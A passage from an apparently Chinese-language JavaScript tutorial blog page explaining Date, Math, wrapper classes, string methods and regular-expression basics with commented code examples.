获取当前时间对象的月份</span></span><br><span class="line"><span class="comment"> * - 会返回一个0-11的值</span></span><br><span class="line"><span class="comment"> * 0 表示1月</span></span><br><span class="line"><span class="comment"> * 1 表示2月</span></span><br><span class="line"><span class="comment"> * 11 表示12月</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> month = d2.<span class="title function_">getMonth</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * getFullYear()</span></span><br><span class="line"><span class="comment"> * - 获取当前日期对象的年份</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> year = d2.<span class="title function_">getFullYear</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(d2);</span></span><br><span class="line"><span class="comment">//console.log(&quot;date = &quot;+date);</span></span><br><span class="line"><span class="comment">//console.log(&quot;day = &quot;+day);</span></span><br><span class="line"><span class="comment">//console.log(&quot;month = &quot;+month);</span></span><br><span class="line"><span class="comment">//console.log(year);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * getTime()</span></span><br><span class="line"><span class="comment"> * - 获取当前日期对象的时间戳</span></span><br><span class="line"><span class="comment"> * - 时间戳，指的是从格林威治标准时间的1970年1月1日，0时0分0秒</span></span><br><span class="line"><span class="comment"> * 到当前日期所花费的毫秒数（1秒 = 1000毫秒）</span></span><br><span class="line"><span class="comment"> * - 计算机底层在保存时间时使用都是时间戳</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> time = d2.<span class="title function_">getTime</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(time/1000/60/60/24/365);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*var d3 = new Date(&quot;1/1/1970 0:0:0&quot;);</span></span><br><span class="line"><span class="comment">time = d3.getTime(); // 中国时间，有时区限制，差8小时</span></span><br><span class="line"><span class="comment">console.log(time); // -28800000</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//利用时间戳来测试代码的执行的性能</span></span><br><span class="line"><span class="comment">//获取当前的时间戳</span></span><br><span class="line"><span class="keyword">var</span> start = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ; i&lt;<span class="number">100</span> ; i++)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> end = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;执行了：&quot;</span>+(end - start)+<span class="string">&quot;毫秒&quot;</span>);</span><br></pre></td></tr></table></figure><hr><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><ul><li>Math和其他的对象不同，它不是一个构造函数，它属于一个工具类不用创建对象，它里边封装了数学运算相关的属性和方法</li><li>Math.PI<ul><li>表示的圆周率</li></ul></li><li>Math.abs()<ul><li>可以用来计算一个数的绝对值</li></ul></li><li>Math.ceil()<ul><li>可以对一个数进行向上取整，小数位只有有值就自动进1</li></ul></li><li>Math.floor()<ul><li>可以对一个数进行向下取整，小数部分会被舍掉</li></ul></li><li>Math.round()<ul><li>可以对一个数进行四舍五入取整</li></ul></li><li>Math.random()<ul><li>可以用来生成一个0-1之间的随机数</li><li>生成一个0-x之间的随机数：Math.round(Math.random()*x)</li></ul></li><li>Math.max()、Math.min()<ul><li>可以获取多个数中的最大值、最小值</li></ul></li><li>Math.pow(x,y)<ul><li>返回x的y次幂</li></ul></li><li>Math.sqrt()<ul><li>用于对一个数进行开方运算</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Math.PI 表示的圆周率</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//console.log(Math.PI);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * abs()可以用来计算一个数的绝对值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//console.log(Math.abs(-1));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Math.ceil()</span></span><br><span class="line"><span class="comment"> * - 可以对一个数进行向上取整，小数位只有有值就自动进1</span></span><br><span class="line"><span class="comment"> * Math.floor()</span></span><br><span class="line"><span class="comment"> * - 可以对一个数进行向下取整，小数部分会被舍掉</span></span><br><span class="line"><span class="comment"> * Math.round()</span></span><br><span class="line"><span class="comment"> * - 可以对一个数进行四舍五入取整</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//console.log(Math.ceil(1.1));</span></span><br><span class="line"><span class="comment">//console.log(Math.floor(1.99));</span></span><br><span class="line"><span class="comment">//console.log(Math.round(1.4));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Math.random()</span></span><br><span class="line"><span class="comment"> * - 可以用来生成一个0-1之间的随机数</span></span><br><span class="line"><span class="comment"> *  - 生成一个0-10的随机数</span></span><br><span class="line"><span class="comment"> * - 生成一个0-x之间的随机数</span></span><br><span class="line"><span class="comment"> * Math.round(Math.random()*x)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * - 生成一个1-10</span></span><br><span class="line"><span class="comment"> * - 生成一个x-y之间的随机数</span></span><br><span class="line"><span class="comment"> * Math.round(Math.random()*(y-x)+x)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*for(var i=0 ; i&lt;100 ; i++)&#123;</span></span><br><span class="line"><span class="comment">    //console.log(Math.round(Math.random()*10));</span></span><br><span class="line"><span class="comment">    //console.log(Math.round(Math.random()*20));</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    //console.log(Math.round(Math.random()*9)+1);</span></span><br><span class="line"><span class="comment">    //console.log(Math.round(Math.random()*8)+2);</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    //生成1-6之间的随机数</span></span><br><span class="line"><span class="comment">    console.log(Math.round(Math.random()*5+1));</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * max() 可以获取多个数中的最大值</span></span><br><span class="line"><span class="comment"> * min() 可以获取多个数中的最小值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> max = <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">10</span>,<span class="number">45</span>,<span class="number">30</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">var</span> min = <span class="title class_">Math</span>.<span class="title function_">min</span>(<span class="number">10</span>,<span class="number">45</span>,<span class="number">30</span>,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//console.log(min);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Math.pow(x,y)</span></span><br><span class="line"><span class="comment"> * 返回x的y次幂</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(Math.pow(12,3));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Math.sqrt()</span></span><br><span class="line"><span class="comment"> *  用于对一个数进行开方运算</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">2</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h1><ul><li>基本数据类型：String Number Boolean Null Undefined</li><li>引用数据类型：Object</li><li>在JS中为我们提供了三个包装类，通过这三个包装类可以将基本数据类型的数据转换为对象<ul><li>String()<ul><li>可以将基本数据类型字符串转换为String对象</li></ul></li><li>Number()<ul><li>可以将基本数据类型的数字转换为Number对象</li></ul></li><li>Boolean()<ul><li>可以将基本数据类型的布尔值转换为Boolean对象</li></ul></li></ul></li><li>但是注意：我们在实际应用中不会使用基本数据类型的对象，如果使用基本数据类型的对象，在做一些比较时可能会带来一些不可预期的结果<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个Number类型的对象</span></span><br><span class="line"><span class="comment">//num = 3;</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">var</span> num2 = <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> str2 = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> bool = <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">var</span> bool2 = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向num中添加一个属性</span></span><br><span class="line">num.<span class="property">hello</span> = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(str === str2);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*if(b)&#123;</span></span><br><span class="line"><span class="comment">    alert(&quot;我运行了~~~&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 方法和属性之能添加给对象，不能添加给基本数据类型</span></span><br><span class="line"><span class="comment"> * 当我们对一些基本数据类型的值去调用属性和方法时，</span></span><br><span class="line"><span class="comment"> * 浏览器会临时使用包装类将其转换为对象，然后在调用对象的属性和方法</span></span><br><span class="line"><span class="comment"> * 调用完以后，在将其转换为基本数据类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">s = s.<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">s.<span class="property">hello</span> = <span class="string">&quot;你好&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="property">hello</span>);</span><br><span class="line"><span class="comment">//console.log(typeof s);</span></span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h1><ul><li>length属性<ul><li>可以用来获取字符串的长度</li></ul></li><li>concat()<ul><li>可以用来连接两个或多个字符串，作用和+一样</li></ul></li><li>indexof()<ul><li>该方法可以检索一个字符串中是否含有指定内容</li><li>如果字符串中含有该内容，则会返回其第一次出现的索引；如果没有找到指定的内容，则返回-1</li><li>可以指定一个第二个参数，指定开始查找的位置</li></ul></li><li>lastIndexOf()<ul><li>该方法的用法和indexOf()一样</li><li>不同的是indexOf是从前往后找，而lastIndexOf是从后往前找</li><li>也可以指定开始查找的位置</li></ul></li><li>slice()<ul><li>可以从字符串中截取指定的内容</li><li>不会影响原字符串，而是将截取到内容返回</li><li>参数：<ul><li>第一个，开始位置的索引（包括开始位置）</li><li>第二个，结束位置的索引（不包括结束位置）,如果省略第二个参数，则会截取到后边所有的</li><li>也可以传递一个负数作为参数，负数的话将会从后边计算</li></ul></li></ul></li><li>substring()<ul><li>可以用来截取一个字符串，可以slice()类似</li><li>参数：<ul><li>第一个：开始截取位置的索引（包括开始位置）</li><li>第二个：结束位置的索引（不包括结束位置）</li><li>不同的是这个方法不能接受负值作为参数， 如果传递了一个负值，则默认使用0</li><li>而且他还自动调整参数的位置，如果第二个参数小于第一个，则自动交换</li></ul></li></ul></li><li>substr()<ul><li>用来截取字符串</li><li>参数：<ul><li>截取开始位置的索引</li><li>截取的长度</li></ul></li></ul></li><li>split()<ul><li>可以将一个字符串拆分为一个数组</li><li>参数：<ul><li>需要一个字符串作为参数，将会根据该字符串去拆分数组</li><li>如果传递一个空串作为参数，则会将每个字符都拆分为数组中的一个元素</li></ul></li></ul></li><li>toUpperCase()<ul><li>将一个字符串转换为大写并返回</li></ul></li><li>toLowerCase()<ul><li>将一个字符串转换为小写并返回</li></ul></li><li>charAt()<ul><li>可以返回字符串中指定位置的字符，根据索引获取指定的字符</li></ul></li><li>charCodeAt()<ul><li>获取指定位置字符的字符编码（Unicode编码）</li></ul></li><li>String.formCharCode()<ul><li>可以根据字符编码去获取字符</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个字符串</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello Atguigu&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在底层字符串是以字符数组的形式保存的</span></span><br><span class="line"><span class="comment"> * [&quot;H&quot;,&quot;e&quot;,&quot;l&quot;]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * length属性</span></span><br><span class="line"><span class="comment"> * - 可以用来获取字符串的长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//console.log(str.length);</span></span><br><span class="line"><span class="comment">//console.log(str[5]);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * charAt()</span></span><br><span class="line"><span class="comment"> * - 可以返回字符串中指定位置的字符</span></span><br><span class="line"><span class="comment"> * - 根据索引获取指定的字符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">str = <span class="string">&quot;中Hello Atguigu&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = str.<span class="title function_">charAt</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * charCodeAt()</span></span><br><span class="line"><span class="comment"> * - 获取指定位置字符的字符编码（Unicode编码）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">result = str.<span class="title function_">charCodeAt</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * String.formCharCode()</span></span><br><span class="line"><span class="comment"> * - 可以根据字符编码去获取字符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">result = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">0x2692</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * concat()</span></span><br><span class="line"><span class="comment"> * - 可以用来连接两个或多个字符串</span></span><br><span class="line"><span class="comment"> * - 作用和+一样</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">result = str.<span class="title function_">concat</span>(<span class="string">&quot;你好&quot;</span>,<span class="string">&quot;再见&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * indexof()</span></span><br><span class="line"><span class="comment"> * - 该方法可以检索一个字符串中是否含有指定内容</span></span><br><span class="line"><span class="comment"> * - 如果字符串中含有该内容，则会返回其第一次出现的索引</span></span><br><span class="line"><span class="comment"> * 如果没有找到指定的内容，则返回-1</span></span><br><span class="line"><span class="comment"> * - 可以指定一个第二个参数，指定开始查找的位置</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * lastIndexOf();</span></span><br><span class="line"><span class="comment"> * - 该方法的用法和indexOf()一样，</span></span><br><span class="line"><span class="comment"> * 不同的是indexOf是从前往后找，</span></span><br><span class="line"><span class="comment"> * 而lastIndexOf是从后往前找</span></span><br><span class="line"><span class="comment"> * - 也可以指定开始查找的位置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">str = <span class="string">&quot;hello hatguigu&quot;</span>;</span><br><span class="line"></span><br><span class="line">result = str.<span class="title function_">indexOf</span>(<span class="string">&quot;h&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">result = str.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;h&quot;</span>,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * slice()</span></span><br><span class="line"><span class="comment"> * - 可以从字符串中截取指定的内容</span></span><br><span class="line"><span class="comment"> * - 不会影响原字符串，而是将截取到内容返回</span></span><br><span class="line"><span class="comment"> * - 参数：</span></span><br><span class="line"><span class="comment"> * 第一个，开始位置的索引（包括开始位置）</span></span><br><span class="line"><span class="comment"> * 第二个，结束位置的索引（不包括结束位置）</span></span><br><span class="line"><span class="comment"> * - 如果省略第二个参数，则会截取到后边所有的</span></span><br><span class="line"><span class="comment"> * - 也可以传递一个负数作为参数，负数的话将会从后边计算</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">str = <span class="string">&quot;abcdefghijk&quot;</span>;</span><br><span class="line"></span><br><span class="line">result = str.<span class="title function_">slice</span>(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line">result = str.<span class="title function_">slice</span>(<span class="number">1</span>,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * substring()</span></span><br><span class="line"><span class="comment"> * - 可以用来截取一个字符串，可以slice()类似</span></span><br><span class="line"><span class="comment"> * - 参数：</span></span><br><span class="line"><span class="comment"> * - 第一个：开始截取位置的索引（包括开始位置）</span></span><br><span class="line"><span class="comment"> * - 第二个：结束位置的索引（不包括结束位置）</span></span><br><span class="line"><span class="comment"> * - 不同的是这个方法不能接受负值作为参数，</span></span><br><span class="line"><span class="comment"> * 如果传递了一个负值，则默认使用0</span></span><br><span class="line"><span class="comment"> * - 而且他还自动调整参数的位置，如果第二个参数小于第一个，则自动交换</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">result = str.<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * substr()</span></span><br><span class="line"><span class="comment"> * - 用来截取字符串</span></span><br><span class="line"><span class="comment"> * - 参数：</span></span><br><span class="line"><span class="comment"> * 1.截取开始位置的索引</span></span><br><span class="line"><span class="comment"> * 2.截取的长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">str = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line"></span><br><span class="line">result = str.<span class="title function_">substr</span>(<span class="number">3</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * split()</span></span><br><span class="line"><span class="comment"> * - 可以将一个字符串拆分为一个数组</span></span><br><span class="line"><span class="comment"> * - 参数：</span></span><br><span class="line"><span class="comment"> * -需要一个字符串作为参数，将会根据该字符串去拆分数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">str = <span class="string">&quot;abcbcdefghij&quot;</span>;</span><br><span class="line"></span><br><span class="line">result = str.<span class="title function_">split</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果传递一个空串作为参数，则会将每个字符都拆分为数组中的一个元素</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">result = str.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(Array.isArray(result));</span></span><br><span class="line"><span class="comment">//console.log(result[0]);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * toUpperCase()</span></span><br><span class="line"><span class="comment"> * - 将一个字符串转换为大写并返回</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">result = str.<span class="title function_">toUpperCase</span>();</span><br><span class="line"></span><br><span class="line">str = <span class="string">&quot;ABCDEFG&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * toLowerCase()</span></span><br><span class="line"><span class="comment"> * -将一个字符串转换为小写并返回</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">result = str.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(result);</span></span><br></pre></td></tr></table></figure><hr><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="创建正则表达式的对象"><a href="#创建正则表达式的对象" class="headerlink" title="创建正则表达式的对象"></a>创建正则表达式的对象</h2><ul><li>正则表达式用于定义一些字符串的规则，计算机可以根据正则表达式，来检查一个字符串是否符合规则，获取将字符串中符合规则的内容提取出来</li><li>语法：var 变量 = new RegExp(“正则表达式”,”匹配模式”);<ul><li>new RegExp(“a”); 这个正则表达式可以来检查一个字符串中是否含有a</li><li>在构造函数中可以传递一个匹配模式作为第二个参数，<ul><li>i 忽略大小写 </li><li>g 全局匹配模式</li></ul></li></ul></li><li>使用typeof检查正则对象，会返回object</li><li>正则表达式的方法：<ul><li>test()：使用这个方法可以用来检查一个字符串是否符合正则表达式的规则，如果符合则返回true，否则返回false<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检查一个字符串中是否含有ab</span></span><br><span class="line"><span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;ab&#x27;</span>, i)</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="keyword">var</span> result = reg.<span class="title function_">test</span>(str) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="字面量创建正则表达式"><a href="#字面量创建正则表达式" class="headerlink" title="字面量创建正则表达式"></a>字面量创建正则表达式</h2><ul><li><p>语法：var 变量 = /正则表达式/匹配模式</p></li><li><p>使用字面量的方式创建更加简单，使用构造函数创建更加灵活</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/a/i</span></span><br><span class="line">reg.<span class="title function_">test</span>(<span class="string">&#x27;Abc&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>使用 | 表示或者的意思</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个正则表达式，检查一个字符串中是否有a或b或c</span></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/a|b|c/</span></span><br></pre></td></tr></table></figure></li><li><p>[]里的内容也是或的关系, [ab] == a|b</p><ul><li>[a-z] 任意小写字母</li><li>[A-Z] 任意大写字母</li><li>[A-z] 任意字母</li><li>[0-9] 任意数字<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查一个字符串中是否含有 abc 或 adc 或 aec</span></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/a[bde]c/</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>[^ ] 除了(只有除了的内容显示false，其他情况显示true)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/[^0-9]/</span>;</span><br><span class="line">reg.<span class="title function_">test</span>(<span class="string">&quot;a&quot;</span>) <span class="comment">// true</span></span><br><span class="line">reg.<span class="title function_">test</span>(<span class="string">&quot;12a3456&quot;</span>) <span class="comment">// true</span></span><br><span class="line">reg.<span class="title function_">test</span>(<span class="string">&quot;12&quot;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="字符串和正则相关的方法"><a href="#字符串和正则相关的方法" class="headerlink" title="字符串和正则相关的方法"></a>字符串和正则相关的方法</h2><ul><li>split()<ul><li>可以将一个字符串拆分为一个数组</li><li>方法中可以传递一个正则表达式作为参数，这样方法将会根据正则表达式去拆分字符串</li><li>这个方法即使不指定全局匹配，也会全都插分<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据任意字母来将字符串拆分</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;1a2b3c4d5e6f7&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> result = str.<span class="title function_">split</span>(<span class="regexp">/[A-z]/</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result) <span class="comment">// [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;]</span></span><br></pre></td></tr></table></figure></li></ul></li><li>search()<ul><li>可以搜索字符串中是否含有指定内容<ul><li>如果搜索到指定内容，则会返回第一次出现的索引，如果没有搜索到返回-1</li></ul></li><li>它可以接受一个正则表达式作为参数，然后会根据正则表达式去检索字符串</li><li>serach()只会查找第一个，即使设置全局匹配也没用<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 搜索字符串中是否含有abc 或 aec 或 afc</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;hello abc hello aec afc&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> result = str.<span class="title function_">search</span>(<span class="regexp">/a[bef]c/</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure></li></ul></li><li>match()<ul><li>可以根据正则表达式，从一个字符串中将符合条件的内容提取出来</li><li>默认情况下match只会找到第一个符合要求的内容，找到以后就停止检索<ul><li>可以设置正则表达式为全局匹配模式，这样就会匹配到所有的内容</li><li>可以为一个正则表达式设置多个匹配模式，且顺序无所谓</li></ul></li><li>match()会将匹配到的内容封装到一个数组中返回，即使只查询到一个结果<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;1a2a3a4a5e6f7A8B9C&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> result = str.<span class="title function_">match</span>(<span class="regexp">/[a-z]/ig</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result) <span class="comment">// [&#x27;a&#x27;, &#x27;a&#x27;, &#x27;a&#x27;, &#x27;a&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]</span></span><br></pre></td></tr></table></figure></li></ul></li><li>replace()<ul><li>可以将字符串中指定内容替换为新的内容</li><li>参数：<ul><li>被替换的内容，可以接受一个正则表达式作为参数</li><li>新的内容</li></ul></li><li>默认只会替换第一个<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;1a2a3a4a5e6f7A8B9C&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> result = str.<span class="title function_">replace</span>(<span class="regexp">/[a-z]/gi</span> , <span class="string">&quot;@_@&quot;</span>); <span class="comment">// 1@_@2@_@3@_@4@_@5@_@6@_@7@_@8@_@9@_@</span></span><br><span class="line">result = str.<span class="title function_">replace</span>(<span class="regexp">/[a-z]/gi</span> , <span class="string">&quot;&quot;</span>); <span class="comment">// 123456789</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="简写正则"><a href="#简写正则" class="headerlink" title="简写正则"></a>简写正则</h2><ul><li><p>量词</p><ul><li>通过量词可以设置一个内容出现的次数</li><li>量词只对它前边的一个内容起作用</li><li>{n} 正好出现连续n个</li><li>{m,n} 匹配包含最少 m 个、最多 n 个</li><li>{m,} 至少m个</li><li>+ 至少一个，相当于{1,}</li><li>* 0个或多个，相当于{0,}</li><li>? 0个或1个，相当于{0,1}<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/a&#123;3&#125;/</span>;</span><br><span class="line">reg = <span class="regexp">/(ab)&#123;3&#125;/</span>;</span><br><span class="line">reg = <span class="regexp">/b&#123;3&#125;/</span>;</span><br><span class="line">reg = <span class="regexp">/ab&#123;1,3&#125;c/</span>;</span><br><span class="line">reg = <span class="regexp">/ab&#123;3,&#125;c/</span>;</span><br><span class="line">reg = <span class="regexp">/ab+c/</span>;</span><br><span class="line">reg = <span class="regexp">/ab*c/</span>;</span><br><span class="line">reg = <span class="regexp">/ab?c/</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>检查一个字符串开头或结尾</p><ul><li>^ 表示开头</li><li>$ 表示结尾<br>如果在正则表达式中<code>同时使用^ $</code>则要求字符串必须<code>完全</code>符合正则表达式<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^a/</span>; <span class="comment">//匹配开头的a</span></span><br><span class="line">reg = <span class="regexp">/a$/</span>; <span class="comment">//匹配结尾的a</span></span><br><span class="line">reg = <span class="regexp">/^a$/</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">test</span>(<span 